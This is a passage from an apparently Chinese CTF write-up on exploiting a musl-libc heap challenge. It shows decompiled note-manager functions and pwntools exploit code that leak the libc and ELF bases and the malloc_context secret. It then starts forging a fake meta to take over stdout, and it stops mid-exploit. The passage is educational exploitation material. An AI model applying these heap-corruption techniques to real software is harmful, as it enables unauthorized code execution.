+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">add</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="o">*</span><span class="n">heap_ptr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">heap_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="nf">calloc</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">heap_ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nf">create_name</span><span class="p">(</span><span class="n">heap_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">heap_ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nf">create_note</span><span class="p">(</span><span class="n">heap_ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">heap_ptr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">global_note</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">global_note</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">heap_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ok&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">delete</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">  <span class="n">ptr_1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">create_name</span><span class="p">((</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">find_name</span><span class="p">(</span><span class="n">ptr_1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">global_note</span> <span class="o">||</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">global_note</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">)</span><span class="c1">// 要删除的是中间或末尾节点
+</span></span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>                                         <span class="c1">// 遍历链表找到指向ptr的前一个节点的next指针位置
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span> <span class="n">p_global_note</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">global_note</span><span class="p">;</span> <span class="n">ptr</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">p_global_note</span><span class="p">;</span> <span class="n">p_global_note</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">p_global_note</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="n">p_global_note</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>  <span class="c1">// 更新前一个节点的next指针，从链表中移除ptr
+</span></span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">global_note</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                          <span class="c1">// 要删除的是头节点且没有后继节点
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>                        <span class="c1">// 释放name指针
+</span></span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>                  <span class="c1">// 释放note_content指针
+</span></span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>                                  <span class="c1">// 释放节点本身
+</span></span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ok&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;oops.....&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">ptr_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="流程"><span>流程</span>
+  <a href="#%e6%b5%81%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>整体流程可以分为这三步：</p>
+<ul>
+<li>泄露<code>elfbase</code>、<code>libc_base</code></li>
+<li>泄露<code>secret</code></li>
+<li>把堆块申请在<code>stdout</code></li>
+</ul>
+<h4 class="heading-element" id="第一步"><span>第一步</span>
+  <a href="#%e7%ac%ac%e4%b8%80%e6%ad%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>在前面两步泄露地址中，只需要关注<code>active[2]</code>这个链表（0x30大小）</p>
+<p><code>add</code>一次，申请一个<code>0x30</code>大小的<code>note1</code>，来防止<code>free</code>掉<code>group</code>中所有<code>chunk</code>时，将整个<code>group</code>归还给堆管理器</p>
+<div class="details admonition note open">
+    <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-pencil-alt" aria-hidden="true"></i>Note<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div><div class="details-content">
+      <div class="admonition-content"><p>接下来需要注意，<code>group</code>对<code>chunk</code>的管理策略：</p>
+<ul>
+<li><code>malloc</code>的时候取的是<code>avail_mask</code>中最低位的堆块，也就是一个<code>group</code>中最低地址的堆块</li>
+<li>被<code>free</code>掉的堆块，会把它的<code>free_mask</code>置1，<code>avail_mask</code>不动还是0</li>
+<li>当一个<code>group</code>中没有<code>avail</code>堆块时，会把被<code>free</code>的堆块标记成<code>avail</code>，<code>free_mask</code>就置0了</li>
+</ul></div>
+    </div>
+</div>
+<p>接着把<code>note2</code>申请到<code>active[2]</code>的第十个<code>chunk</code>的位置，<code>note2_content</code>申请到第二个的位置</p>
+<p>申请<code>note3</code>，并把<code>note2</code>给<code>free</code>掉，此时<code>note3</code>还记录着<code>note2</code>的位置即第十个<code>chunk</code>的位置</p>
+<p>接着在<code>note2_content</code>的位置申请<code>note4</code>，泄露出<code>note4</code>记录的两个堆地址</p>
+<div class="details admonition note open">
+    <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-pencil-alt" aria-hidden="true"></i>Note<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div><div class="details-content">
+      <div class="admonition-content">musl申请的堆块，有的大小能泄露elfbase，有的能泄露libc</div>
+    </div>
+</div>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">## leak libcbase &amp;&amp; elfbase</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1">#防止将整个group归还给堆管理器</span>
+</span></span><span class="line"><span class="cl"><span class="n">cho</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delet</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1">#一个堆块泄露elfbase，一个libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x28:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb7d60</span> <span class="c1">#参考文章中，这里我本地不太对</span>
+</span></span><span class="line"><span class="cl"><span class="n">libcbase_true</span><span class="o">=</span><span class="n">libcbase</span> <span class="o">-</span> <span class="mh">0x2b020</span> <span class="o">+</span> <span class="mh">0x4000</span> <span class="c1">#调整了一下，我本地这个是对的</span>
+</span></span><span class="line"><span class="cl"><span class="n">elfbase</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x4c40</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libcbase&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libcbase_true&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;elfbase&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h4 class="heading-element" id="第二步"><span>第二步</span>
+  <a href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>把原本<code>note2</code>中执行<code>content</code>的指针改成<code>malloc_context</code>，<code>show</code>即可</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># leak secret</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pd</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">elfbase</span><span class="o">+</span><span class="mh">0x4fc0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_context</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="n">pd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">find</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;0x28:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span><span class="mi">16</span><span class="p">),</span><span class="n">endianness</span><span class="o">=</span><span class="s2">&#34;big&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;secret&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><h4 class="heading-element" id="第三步"><span>第三步</span>
+  <a href="#%e7%ac%ac%e4%b8%89%e6%ad%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>此时，能通过修改<code>note2_content</code>来进行任意地址读和<code>free</code></p>
+<p>有了<code>elfbase</code>、<code>libc_base</code>、<code>secret</code>，接下来就是把堆块申请到<code>stdout</code>上，通过<code>puts</code>打<code>IO</code></p>
+<p>把堆块申请到<code>stdout</code>上，需要：</p>
+<ul>
+<li>在<code>stdout-0x10</code>伪造一个<code>group</code>。通过<code>dequeue</code>，在<code>stdout-0x10</code>写上<code>fake_group_addr</code></li>
+<li>利用<code>queue</code> 把<code>fake_meta</code>链入<code>active</code>链表</li>
+</ul>
+<p><strong>dequeue</strong></p>
+<p>触发<code>dequeue</code>需要<code>fake_meta</code>的构造：</p>
+<ol>
+<li>通过<code>get_meta()</code> 所有<code>assert</code>。包括：
+<ul>
+<li><code>fake_meta</code>那个页的起始的<code>secret</code>要等于<code>malloc_context</code>的<code>secret</code></li>
+<li><code>fake_meta</code> 中保存的 <code>group</code> 指针要正确</li>
+<li>被<code>free</code>掉的<code>chunk</code>的<code>index</code>小于等于<code>fake_meta-&gt;last_idx</code></li>
+</ul>
+</li>
+<li><code>nontrivial_free()</code> 进入 第一个 if 分支。包括：
+<ul>
+<li><code>free_able == 1</code></li>
+</ul>
+</li>
+<li>伪造<code>prev</code>、<code>next</code>，通过<code>dequeue的unlink</code>写<code>stdout-0x10</code></li>
+</ol>
+<p>然后，通过任意地址<code>free</code>，<code>free</code>掉<code>fake_group</code>的第一个<code>chunk</code>，执行<code>dequeue</code></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-py"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># set fake meta</span>
